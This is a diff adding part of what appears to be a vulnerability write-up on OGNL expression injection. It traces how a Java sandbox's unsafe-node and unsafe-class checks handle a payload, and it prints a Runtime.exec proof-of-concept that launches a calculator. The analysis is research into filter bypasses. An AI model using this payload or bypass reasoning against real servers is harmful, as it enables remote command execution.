@@ -224,3 +224,35 @@ String nodeClassName = node.getClass().getName();
         } else if ("ognl.ASTConst".equals(nodeClassName) && !this.isSafeConstantExpressionNode(node, visitedExpressions)) {
             return true;
 ```
+
+So our expression need to be not in the `UNSAFE_NODE_TYPES` first, and then we have to make our expression pass all the check after `&&` in the else if conditions.
+
+Back to this payload:
+```java
+${"" + Class.forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null,null).exec("gnome-calculator")}}
+```
+
+We have passed the AST parser checks, we just hit a final block stone is `isUnsafeClass` check. Our OGNL Expression was blocked because in this for loop:
+```java
+for(int i = 0; i < node.jjtGetNumChildren(); ++i) {
+                Node childNode = node.jjtGetChild(i);
+                if (childNode != null && this.containsUnsafeExpression(childNode, visitedExpressions)) {
+                    return true;
+                }
+ }
+```
+
+After a few loops, our expression broke down to smaller and smaller string ( here is `childNode` )
+```
+i = 0
+node = Class
+childNode = forName("java.lang.Runtime")
+---------------
+i = 1
+node = forName("java.lang.Runtime")
+childNode = java.lang.Runtime
+----------
+i = 2
+node = java.lang.Runtime => this is where we failed when this function is called this.isUnSafeClass(node.toString())
+```
+
